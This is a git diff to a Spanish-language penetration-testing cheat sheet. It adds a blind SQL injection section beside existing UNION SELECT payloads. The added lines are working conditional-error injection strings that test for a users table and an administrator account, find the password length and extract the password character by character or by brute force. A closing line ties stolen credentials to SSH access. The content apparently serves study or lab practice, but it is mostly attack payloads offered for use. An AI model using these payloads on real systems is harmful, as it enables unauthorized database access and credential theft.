@@ -419,6 +419,17 @@ Enlistar nombres de todas las columnas de una tabla
 Leer contenido de la columna
 'UNION SELECT campo1,campo2 FROM nombre de la tabla--
 ```
+## Blind SQLi
+Se intenta inyectando en cookies si en los parametros GET no se obtiene ningun tipo de respuesta.
+
+Errores Condicionales
+```
+xyz' AND (SELECT 'a' FROM users LIMIT 1)='a  (Verifica que existe la tabla users)
+xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a (Verifica que existe ese usuario en la tabla)
+xyz' and (select 'a' from users where username='administrator' and length (password)>[longitud])='a (verifica la longitud del password)
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) >=< '[caracter a iterar] (itera caracter por caracter)
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, LENGTH('[palabra]')) = '[palabra] (permite hacer fuerza bruta con la palabra completa)
+```
 ## Privilege Escalation
 Recuerda: Usuario + contrasena + IP --> SSH
 ```
